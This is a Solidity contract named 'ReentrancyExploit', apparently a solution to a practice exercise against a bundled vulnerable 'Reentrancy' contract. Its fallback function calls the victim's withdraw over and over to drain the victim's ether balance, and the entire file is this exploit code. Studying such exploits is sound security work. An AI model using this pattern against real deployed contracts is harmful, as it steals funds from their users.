// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;
// pragma solidity ^0.8.0;

import '../Reentrancy.sol';

contract ReentrancyExploit {

    Reentrancy public victimContract;
    uint public amount = 0.001 ether;

    constructor(address payable _victimContractAddr) public payable {
        victimContract = Reentrancy(_victimContractAddr);
    }

    function donateToVictim() public {
        victimContract.donate.value(amount).gas(4000000)(address(this));
    }

    fallback() external payable {
        if(address(victimContract).balance != 0) {
            victimContract.withdraw(amount);
        }
    }
}
